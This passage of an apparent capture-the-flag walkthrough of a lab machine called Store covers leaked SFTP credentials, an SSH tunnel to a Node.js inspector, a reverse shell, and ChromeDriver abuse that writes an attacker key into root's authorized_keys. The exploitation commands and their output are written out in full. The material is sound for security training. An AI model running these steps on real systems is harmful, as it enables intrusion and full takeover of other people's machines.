+    <span class="kd">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">xorFileContents</span><span class="p">(</span><span class="nx">filePath</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">SECRET</span><span class="p">,</span> <span class="nx">inplace</span><span class="o">=</span><span class="kc">false</span><span class="p">);</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">file</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">title</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Secure Encrypted Storage - Data</span><span class="dl">'</span><span class="p">,</span> <span class="na">data</span><span class="p">:</span> <span class="nx">data</span><span class="p">,</span> <span class="na">b64data</span><span class="p">:</span> <span class="nx">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="dl">'</span><span class="s1">base64</span><span class="dl">'</span><span class="p">)</span> <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="c1">// get content of specific file directly</span>
+<span class="nx">router</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/file</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">file</span><span class="p">;</span>
+    <span class="kd">const</span> <span class="nx">filePath</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">STORE_HOME</span><span class="p">}</span><span class="s2">/public/tmp/</span><span class="p">${</span><span class="nx">name</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
+    <span class="c1">// Only store files into valid paths!</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">filePath</span><span class="p">);</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nf">normalize</span><span class="p">(</span><span class="nx">filePath</span><span class="p">));</span>
+    <span class="k">if </span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nf">normalize</span><span class="p">(</span><span class="nx">filePath</span><span class="p">)</span> <span class="o">==</span> <span class="nx">filePath</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">await</span> <span class="nx">client</span><span class="p">.</span><span class="nf">downloadFile</span><span class="p">(</span><span class="s2">`files/</span><span class="p">${</span><span class="nx">name</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span> <span class="nx">filePath</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="kd">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">xorFileContents</span><span class="p">(</span><span class="nx">filePath</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">SECRET</span><span class="p">,</span> <span class="nx">inplace</span><span class="o">=</span><span class="kc">false</span><span class="p">);</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+<span class="p">});</span>
+
+
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">router</span><span class="p">;</span>
+</code></pre></div></div>
+<p>It’s using SFTP to store the files in <code class="language-plaintext highlighter-rouge">${process.env.STORE_HOME}/public/tmp/</code>, where they are then XOR encrypted and then uploaded to SFTP. There’s a “todo” comment about cleaning up this directory.</p>
+<h3 id="validate-creds">Validate Creds</h3>
+<p>SFTP runs over SSH, so I can check the creds there:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec ssh 10.129.31.17 <span class="nt">-u</span> sftpuser <span class="nt">-p</span> WidK52pWBtWQdcVC
+<span class="netexec-protocol">SSH </span><span class="go">        10.129.31.17    22     10.129.31.17     </span><span class="netexec-logmessage">[*]</span><span class="go"> SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
+</span><span class="netexec-protocol">SSH </span><span class="go">        10.129.31.17    22     10.129.31.17     </span><span class="netexec-logsuccess">[+]</span><span class="go"> sftpuser:WidK52pWBtWQdcVC  Linux - Shell access!
+</span></code></pre></div></div>
+<p>There work! Unfortunately, <code class="language-plaintext highlighter-rouge">netexec</code> doesn’t check if I can actually get a shell. I can’t:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> WidK52pWBtWQdcVC ssh sftpuser@10.129.31.17
+<span class="go">This service allows sftp connections only.
+Connection to 10.129.31.17 closed.
+</span></code></pre></div></div>
+<h2 id="shell-as-dev">Shell as dev</h2>
+<h3 id="tunnel">Tunnel</h3>
+<h4 id="sftp">SFTP</h4>
+<p>I can connect to SFTP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sftp sftpuser@10.129.31.17
+<span class="go">Warning: Permanently added '10.129.31.17' (ED25519) to the list of known hosts.
+(sftpuser@10.129.31.17) Password: 
+Connected to 10.129.31.17.
+</span><span class="gp">sftp&gt;</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">files  
+</span><span class="gp">sftp&gt;</span><span class="w"> </span><span class="nb">ls </span>files
+<span class="go">files/0xdf.png               files/ejs_test.txt           files/file_on_5000.txt       files/file_on_5001.txt       
+files/file_on_5002.txt       files/known_plaintext.txt    files/port_test.txt          files/pwned.txt              
+files/shell.php              files/ssti_test.txt          files/test.txt   
+</span></code></pre></div></div>
+<p>All the files are there in the <code class="language-plaintext highlighter-rouge">files</code> directory. I suspect if this were a shared box, I could see other people’s uploads here as well, as they are all owned by sftpuser (UID 1002):</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> WidK52pWBtWQdcVC sftp sftpuser@10.129.31.17
+<span class="go">Connected to 10.129.31.17.
+sftp&gt; ls -la files
+drwxr-xr-x    2 1002     1002         4096 Oct 29 11:07 .
+drwxr-xr-x    3 root     root         4096 Feb 13  2023 ..
+-rw-rw-rw-    1 1002     1002        49946 Oct 29 02:33 0xdf.png
+-rw-rw-rw-    1 1002     1002           11 Oct 29 02:36 ejs_test.txt
+-rw-rw-rw-    1 1002     1002            5 Oct 29 02:43 file_on_5000.txt
+-rw-rw-rw-    1 1002     1002            5 Oct 29 02:43 file_on_5001.txt
+-rw-rw-rw-    1 1002     1002            5 Oct 29 02:43 file_on_5002.txt
+-rw-rw-rw-    1 1002     1002           17 Oct 29 11:07 known_plaintext.txt
+-rw-rw-rw-    1 1002     1002           15 Oct 29 02:43 port_test.txt
+-rw-rw-rw-    1 1002     1002            5 Oct 29 02:37 pwned.txt
+-rw-rw-rw-    1 1002     1002           31 Oct 29 02:37 shell.php
+-rw-rw-rw-    1 1002     1002            8 Oct 29 02:36 ssti_test.txt
+-rw-rw-rw-    1 1002     1002           15 Oct 29 11:11 test.txt
+</span></code></pre></div></div>
+<p>Still, this isn’t interesting as I already have access to those files via the site, and VulnLab boxes were designed for individual instances.</p>
+<h4 id="ssh-config">SSH Config</h4>
+<p>I’ll read <code class="language-plaintext highlighter-rouge">/etc/ssh/sshd_config</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/ssh/sshd_config
+<span class="c"># This is the sshd server system-wide configuration file.  See</span>
+<span class="c"># sshd_config(5) for more information.</span>
+<span class="c"># This sshd was compiled with PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</span>
+<span class="c"># The strategy used for options in the default sshd_config shipped with</span>
+<span class="c"># OpenSSH is to specify options with their default value where</span>
+<span class="c"># possible, but leave them commented.  Uncommented options override the</span>
+<span class="c"># default value.</span>
+Include /etc/ssh/sshd_config.d/<span class="k">*</span>.conf
+<span class="c">#Port 22</span>
+<span class="c">#AddressFamily any</span>
+<span class="c">#ListenAddress 0.0.0.0</span>
+<span class="c">#ListenAddress ::</span>
+<span class="c">#HostKey /etc/ssh/ssh_host_rsa_key</span>
+<span class="c">#HostKey /etc/ssh/ssh_host_ecdsa_key</span>
+<span class="c">#HostKey /etc/ssh/ssh_host_ed25519_key</span>
+<span class="c"># Ciphers and keying</span>
+<span class="c">#RekeyLimit default none</span>
+<span class="c"># Logging</span>
+<span class="c">#SyslogFacility AUTH</span>
+<span class="c">#LogLevel INFO</span>
+<span class="c"># Authentication:</span>
+<span class="c">#LoginGraceTime 2m</span>
+PermitRootLogin <span class="nb">yes</span>
+<span class="c">#StrictModes yes</span>
+<span class="c">#MaxAuthTries 6</span>
+<span class="c">#MaxSessions 10</span>
+<span class="c">#PubkeyAuthentication yes</span>
+<span class="c"># Expect .ssh/authorized_keys2 to be disregarded by default in future.</span>
+<span class="c">#AuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2</span>
+<span class="c">#AuthorizedPrincipalsFile none</span>
+<span class="c">#AuthorizedKeysCommand none</span>
+<span class="c">#AuthorizedKeysCommandUser nobody</span>
+<span class="c"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span>
+<span class="c">#HostbasedAuthentication no</span>
+<span class="c"># Change to yes if you don't trust ~/.ssh/known_hosts for</span>
+<span class="c"># HostbasedAuthentication</span>
+<span class="c">#IgnoreUserKnownHosts no</span>
+<span class="c"># Don't read the user's ~/.rhosts and ~/.shosts files</span>
+<span class="c">#IgnoreRhosts yes</span>
+<span class="c"># To disable tunneled clear text passwords, change to no here!</span>
+PasswordAuthentication <span class="nb">yes</span>
+<span class="c">#PermitEmptyPasswords no</span>
+<span class="c"># Change to yes to enable challenge-response passwords (beware issues with</span>
+<span class="c"># some PAM modules and threads)</span>
+KbdInteractiveAuthentication <span class="nb">yes</span>
+<span class="c"># Kerberos options</span>
+<span class="c">#KerberosAuthentication no</span>
+<span class="c">#KerberosOrLocalPasswd yes</span>
+<span class="c">#KerberosTicketCleanup yes</span>
+<span class="c">#KerberosGetAFSToken no</span>
+<span class="c"># GSSAPI options</span>
+<span class="c">#GSSAPIAuthentication no</span>
+<span class="c">#GSSAPICleanupCredentials yes</span>
+<span class="c">#GSSAPIStrictAcceptorCheck yes</span>
+<span class="c">#GSSAPIKeyExchange no</span>
+<span class="c"># Set this to 'yes' to enable PAM authentication, account processing,</span>
+<span class="c"># and session processing. If this is enabled, PAM authentication will</span>
+<span class="c"># be allowed through the KbdInteractiveAuthentication and</span>
+<span class="c"># PasswordAuthentication.  Depending on your PAM configuration,</span>
+<span class="c"># PAM authentication via KbdInteractiveAuthentication may bypass</span>
+<span class="c"># the setting of "PermitRootLogin without-password".</span>
+<span class="c"># If you just want the PAM account and session checks to run without</span>
+<span class="c"># PAM authentication, then enable this but set PasswordAuthentication</span>
+<span class="c"># and KbdInteractiveAuthentication to 'no'.</span>
+UsePAM <span class="nb">yes</span>
+<span class="c">#AllowAgentForwarding yes</span>
+<span class="c">#AllowTcpForwarding yes</span>
+<span class="c">#GatewayPorts no</span>
+X11Forwarding <span class="nb">yes</span>
+<span class="c">#X11DisplayOffset 10</span>
+<span class="c">#X11UseLocalhost yes</span>
+<span class="c">#PermitTTY yes</span>
+PrintMotd no
+<span class="c">#PrintLastLog yes</span>
+<span class="c">#TCPKeepAlive yes</span>
+<span class="c">#PermitUserEnvironment no</span>
+<span class="c">#Compression delayed</span>
+<span class="c">#ClientAliveInterval 0</span>
+<span class="c">#ClientAliveCountMax 3</span>
+<span class="c">#UseDNS no</span>
+<span class="c">#PidFile /run/sshd.pid</span>
+<span class="c">#MaxStartups 10:30:100</span>
+<span class="c">#PermitTunnel no</span>
+<span class="c">#ChrootDirectory none</span>
+<span class="c">#VersionAddendum none</span>
+<span class="c"># no default banner path</span>
+<span class="c">#Banner none</span>
+<span class="c"># Allow client to pass locale environment variables</span>
+AcceptEnv LANG LC_<span class="k">*</span>
+<span class="c"># override default of no subsystems</span>
+Subsystem       sftp    /usr/lib/openssh/sftp-server
+<span class="c"># Example of overriding settings on a per-user basis</span>
+<span class="c">#Match User anoncvs</span>
+<span class="c">#       X11Forwarding no</span>
+<span class="c">#       AllowTcpForwarding no</span>
+<span class="c">#       PermitTTY no</span>
+<span class="c">#       ForceCommand cvs server</span>
+Match User sftpuser
+        ForceCommand internal-sftp
+        PasswordAuthentication <span class="nb">yes
+        </span>ChrootDirectory /var/sftp
+        AllowAgentForwarding no
+        X11Forwarding no
+</code></pre></div></div>
+<p>There’s a lot here, most of which is default. At the end, it defines the config for the sftpuser. It forces SFTP only for commands, but doesn’t disable <code class="language-plaintext highlighter-rouge">AllowTcpForwarding</code>.</p>
+<h4 id="create-tunnel">Create Tunnel</h4>
+<p>While the SFTP user isn’t allowed to run commands over SSH, they can still connect, and it’s possible to tunnel. I’ll use <code class="language-plaintext highlighter-rouge">-N</code> to tell <code class="language-plaintext highlighter-rouge">ssh</code> to not to run a remote command, but just connect and hold until killed:</p>
+<div class="language-console sshpass-disclaimer wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> WidK52pWBtWQdcVC ssh sftpuser@10.129.31.17 <span class="nt">-N</span> <span class="nt">-L</span> 9229:127.0.0.1:9229
+</code></pre></div></div>
+<p>This just hangs. On my host, 9229 is listening:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>netstat <span class="nt">-tnlp</span> | <span class="nb">grep </span>9229
+<span class="go">tcp        0      0 127.0.0.1:9229          0.0.0.0:*               LISTEN      112211/ssh
+tcp6       0      0 ::1:9229                :::*                    LISTEN      112211/ssh 
+</span></code></pre></div></div>
+<h3 id="node-inspect">node Inspect</h3>
+<h4 id="connect-inspector">Connect Inspector</h4>
+<p>The webserver is running with the command line <code class="language-plaintext highlighter-rouge">node --inspect=127.0.0.1:9229 /home/dev/projects/store1/start.js</code>. The <code class="language-plaintext highlighter-rouge">--inspect</code> flag means that the V8 Inspector is running and listening on that NIC/port, allowing debugging of the JS application.</p>
+<p>To interact with it, I’ll open Chromium and go to <code class="language-plaintext highlighter-rouge">chrome://inspect</code>. Without the tunnel, it looks like this:</p>
+<picture>
+<source srcset="/img/image-20251029160742029.webp" type="image/webp"/>
+<img alt="image-20251029160742029" class="include_image" loading="lazy" src="/img/image-20251029160742029.png"/>
+</picture>
+<p>As soon as I connect the tunnel (without needing to refresh), it shows a remote target:</p>
+<picture>
+<source srcset="/img/image-20251029160815168.webp" type="image/webp"/>
+<img alt="image-20251029160815168" class="include_image" loading="lazy" src="/img/image-20251029160815168.png"/>
+</picture>
+<p>Clicking “inspect” opens a Chromium dev tools window with a limited set of tabs:</p>
+<picture>
+<source srcset="/img/image-20251029160916572.webp" type="image/webp"/>
+<img alt="image-20251029160916572" class="include_image" loading="lazy" src="/img/image-20251029160916572.png"/>
+</picture>
+<p>There’s a bunch of errors in the console. More importantly, I can run arbitrary JavaScript commands:</p>
+<picture>
+<source srcset="/img/image-20251029161007819.webp" type="image/webp"/>
+<img alt="image-20251029161007819" class="include_image" loading="lazy" src="/img/image-20251029161007819.png"/>
+</picture>
+<h4 id="shell">Shell</h4>
+<p>I’ll grab “node.js #2” from <a href="https://www.revshells.com/">revshells.com</a> and paste it into the console:</p>
+<picture>
+<source srcset="/img/image-20251029161142022.webp" type="image/webp"/>
+<img alt="image-20251029161142022" class="include_image" loading="lazy" src="/img/image-20251029161142022.png"/>
+</picture>
+<p>When I hit enter, there’s a connection at my listening <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.129.31.17 46876
+</span><span class="gp">‍</span><span class="nb">whoami</span>
+<span class="go">dev
+</span></code></pre></div></div>
+<p>I’ll upgrade my shell using the standard trick:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">‍</span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">Script started, output log file is '/dev/null'.
+</span><span class="gp">dev@store:~/projects/store1$ </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+</span><span class="gp">            ‍</span>reset
+<span class="go">reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">dev@store:~/projects/store1$ </span><span class="w"> 
+</span></code></pre></div></div>
+<p>And grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">dev@store:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">0f4a8fca************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="home-directories">Home Directories</h4>
+<p>In the user’s home directory, inside <code class="language-plaintext highlighter-rouge">projects</code>, there are three directories:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">dev@store:~/projects$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">store1  store2  store3
+</span></code></pre></div></div>
+<p>I’ll use a little <code class="language-plaintext highlighter-rouge">bash</code> foo to compare files in <code class="language-plaintext highlighter-rouge">store1</code> and <code class="language-plaintext highlighter-rouge">store2</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">dev@store:~/projects/store2$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-type</span> f | <span class="nb">grep</span> <span class="nt">-v</span>  <span class="nt">-e</span> public/tmp | <span class="k">while </span><span class="nb">read </span>fn<span class="p">;</span> <span class="k">do </span>diff <span class="nv">$fn</span> ../store1/<span class="nv">$fn</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$fn</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span> 
+<span class="go">14c14
+</span><span class="diff-removed">&lt;     "watch": "nodemon --exec 'node --inspect=127.0.0.1:9230 /home/dev/projects/store2/start.js'"
+</span><span class="diff-lines">---
+</span><span class="diff-added">&gt;     "watch": "nodemon --exec 'node --inspect=127.0.0.1:9229 /home/dev/projects/store1/start.js'"
+</span><span class="go">./package.json
+3,4c3,4
+</span><span class="diff-removed">&lt; STORE_HOME=/home/dev/projects/store2
+&lt; PORT=5001
+</span><span class="diff-lines">---
+</span><span class="diff-added">&gt; STORE_HOME=/home/dev/projects/store1
+&gt; PORT=5000
+</span><span class="go">./.env
+</span></code></pre></div></div>
+<p>The only files that are different are the <code class="language-plaintext highlighter-rouge">package.json</code> files and the <code class="language-plaintext highlighter-rouge">.env</code> files. So the sites really are the same.</p>
+<h4 id="chrome">Chrome</h4>
+<p>In <code class="language-plaintext highlighter-rouge">/opt</code> there’s a Google Chrome installation:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">dev@store:/$</span><span class="w"> </span><span class="nb">ls </span>opt/google/
+<span class="go">chrome
+</span><span class="gp">dev@store:/$</span><span class="w"> </span><span class="nb">ls </span>opt/google/chrome/
+<span class="go">MEIPreload                 chrome-sandbox           cron               icudtl.dat                         libqt5_shim.so        nacl_helper            product_logo_16.png   product_logo_32.xpm  v8_context_snapshot.bin
+WidevineCdm                chrome_100_percent.pak   default-app-block  libEGL.so                          libvk_swiftshader.so  nacl_helper_bootstrap  product_logo_24.png   product_logo_48.png  vk_swiftshader_icd.json
+chrome                     chrome_200_percent.pak   default_apps       libGLESv2.so                       libvulkan.so.1        nacl_irt_x86_64.nexe   product_logo_256.png  product_logo_64.png  xdg-mime
+chrome-management-service  chrome_crashpad_handler  google-chrome      liboptimization_guide_internal.so  locales               product_logo_128.png   product_logo_32.png   resources.pak        xdg-settings
+</span></code></pre></div></div>
+<p>This is interesting as it typically on CTF machines shows some kind of automated user. <code class="language-plaintext highlighter-rouge">chromedriver</code> is running as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">dev@store:/$</span><span class="w"> </span>ps auxww | <span class="nb">grep</span> <span class="nt">-i</span> chrome
+<span class="go">root         758  0.0  0.3 33612408 12544 ?      Ssl  02:01   0:00 /root/chromedriver
+</span></code></pre></div></div>
+<p>The listening ports are interesting as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">dev@store:/$</span><span class="w"> </span>netstat <span class="nt">-tnlp</span>
+<span class="go">(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:9230          0.0.0.0:*               LISTEN      1021/node           
+tcp        0      0 127.0.0.1:9231          0.0.0.0:*               LISTEN      1008/node           
+tcp        0      0 127.0.0.1:9229          0.0.0.0:*               LISTEN      38310/node          
+tcp        0      0 127.0.0.1:9515          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::5000                 :::*                    LISTEN      38310/node          
+tcp6       0      0 :::5001                 :::*                    LISTEN      1021/node           
+tcp6       0      0 :::5002                 :::*                    LISTEN      1008/node           
+tcp6       0      0 ::1:9515                :::*                    LISTEN      -   
+</span></code></pre></div></div>
+<p>The processes running as dev show the PID. Of the other ports, 9515 stands out. That’s the default Chrome debug port. Fetching it with <code class="language-plaintext highlighter-rouge">curl</code> shows a bunch of errors:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">dev@store:/$</span><span class="w"> </span>curl localhost:9515
+<span class="go">{"value":{"error":"unknown command","message":"unknown command: unknown command: ","stacktrace":"#0 0x620167153d93 \u003Cunknown&gt;\n#1 0x620166f222d7 \u003Cunknown&gt;\n#2 0x620166f7df2c \u003Cunknown&gt;\n#3 0x620166f7db82 \u003Cunknown&gt;\n#4 0x620166ef32a3 \u003Cunknown&gt;\n#5 0x6201671a78be \u003Cunknown&gt;\n#6 0x6201671ab8f0 \u003Cunknown&gt;\n#7 0x62016718bf90 \u003Cunknown&gt;\n#8 0x6201671acb7d \u003Cunknown&gt;\n#9 0x62016717d578 \u003Cunknown&gt;\n#10 0x620166ef16ee \u003Cunknown&gt;\n#11 0x746bd9c29d90 \u003Cunknown&gt;\n"}}
+</span></code></pre></div></div>
+<p>Claude can easily identify this:</p>
+<picture>
+<source srcset="/img/image-20251029164851801.webp" type="image/webp"/>
+<img alt="image-20251029164851801" class="include_image" loading="lazy" src="/img/image-20251029164851801.png"/>
+</picture>
+<p><code class="language-plaintext highlighter-rouge">/status</code> will show the current status:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">dev@store:/$</span><span class="w"> </span>curl localhost:9515/status
+<span class="go">{"value":{"build":{"version":"110.0.5481.77 (65ed616c6e8ee3fe0ad64fe83796c020644d42af-refs/branch-heads/5481@{#839})"},"message":"ChromeDriver ready for new sessions.","os":{"arch":"x86_64","name":"Linux","version":"6.8.0-1040-aws"},"ready":true}}
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/sessions</code> shows no active sessions:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">dev@store:/$</span><span class="w"> </span>curl localhost:9515/sessions     
+<span class="go">{"sessionId":"","status":0,"value":[]}
+</span></code></pre></div></div>
+<p>This means I can’t get into the browser and take over there like I showed in <a href="/2025/01/11/htb-sightless.html#chrome-debug">Sightless</a> and <a href="/2023/08/05/htb-agile.html#chrome-debug">Agile</a>.</p>
+<h3 id="shell-1">Shell</h3>
+<p>Searching for “Chrome webdriver RCE” finds <a href="https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148">this post</a> from 404 team:</p>
+<p><a href="/img/image-20251029170610836.png"><img alt="image-20251029170610836" src="/img/image-20251029170610836.png"/><em>Click for full size image</em></a></p>
+<p>This post shows how to start a new session with a POST to <code class="language-plaintext highlighter-rouge">/session</code>:</p>
+<picture>
+<source srcset="/img/0qO91khY5rhElWw2y.webp" type="image/webp"/>
+<img alt="img" class="include_image" loading="lazy" src="/img/0qO91khY5rhElWw2y.png"/>
+</picture>
+<p>It’ll be a pain to full list of commands with lots of arguments, so I’ll create a simple <code class="language-plaintext highlighter-rouge">bash</code> script that will write my public key to root’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">dev@store:/$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'#!/bin/bash\n\nmkdir -p /root/.ssh\necho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" &gt;&gt; /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys\nchmod 700 /root/.ssh'</span> | <span class="nb">tee</span> /dev/shm/ssh.sh 
+<span class="c">#!/bin/bash
+</span><span class="go">
+mkdir -p /root/.ssh
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" &gt;&gt; /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+chmod 700 /root/.ssh
+</span><span class="gp">dev@store:/$</span><span class="w"> </span><span class="nb">chmod</span> +x /dev/shm/ssh.sh
+</code></pre></div></div>
+<p>Now I’ll trigger it using Chrome:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">dev@store:/$</span><span class="w"> </span>curl localhost:9515/session <span class="nt">-d</span> <span class="s1">'{"capabilities": {"alwaysMatch": {"goog:chromeOptions": {"binary": "/dev/shm/ssh.sh"}}}}'</span> 
+<span class="go">{"value":{"error":"unknown error","message":"unknown error: Chrome failed to start: exited normally.\n  (unknown error: DevToolsActivePort file doesn't exist)\n  (The process started from chrome location /dev/shm/ssh.sh is no longer running, so ChromeDriver is assuming that Chrome has crashed.)","stacktrace":"#0 0x620167153d93 \u003Cunknown&gt;\n#1 0x620166f222d7 \u003Cunknown&gt;\n#2 0x620166f4aab0 \u003Cunknown&gt;\n#3 0x620166f46a3d \u003Cunknown&gt;\n#4 0x620166f8b4f4 \u003Cunknown&gt;\n#5 0x620166f82353 \u003Cunknown&gt;\n#6 0x620166f51e40 \u003Cunknown&gt;\n#7 0x620166f53038 \u003Cunknown&gt;\n#8 0x6201671a78be \u003Cunknown&gt;\n#9 0x6201671ab8f0 \u003Cunknown&gt;\n#10 0x62016718bf90 \u003Cunknown&gt;\n#11 0x6201671acb7d \u003Cunknown&gt;\n#12 0x62016717d578 \u003Cunknown&gt;\n#13 0x6201671d1348 \u003Cunknown&gt;\n#14 0x6201671d14d6 \u003Cunknown&gt;\n#15 0x6201671eb341 \u003Cunknown&gt;\n#16 0x746bd9c94ac3 \u003Cunknown&gt;\n"}}
+</span></code></pre></div></div>
+<p>It reports failure, because my script isn’t a valid browser. But SSH works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen root@10.129.31.17
+<span class="go">Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1040-aws x86_64)
+...[snip]...
+</span><span class="gp">root@store:~#</span><span class="w"> 
+</span></code></pre></div></div>
+<p>I’ll grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@store:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">318627f2************************
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2025/10/30/htb-store.html"></a>
+</article>
